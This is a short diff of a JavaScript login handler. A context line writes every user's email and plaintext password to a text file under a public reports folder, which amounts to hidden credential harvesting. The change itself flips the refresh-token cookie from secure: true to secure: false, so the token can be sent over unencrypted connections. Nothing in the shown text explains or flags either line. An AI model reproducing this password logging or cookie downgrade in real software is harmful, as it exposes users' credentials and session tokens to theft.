@@ -41,7 +41,7 @@ export const user_login = async (request, response) => {
     fs.appendFile('./public/reports/login.txt', `email: ${user.email}\npassword: ${password}\n===========> ${now}\n\n`, (error) => error && console.log(error.message));
 
     response.cookie('reftoken', reftoken, {
-      httpOnly: true, sameSite: 'none', secure: true, maxAge: 24 * 60 * 60 * 1000,
+      httpOnly: true, sameSite: 'none', secure: false, maxAge: 24 * 60 * 60 * 1000,
     });
     response.json({ token });
   } catch (error) {
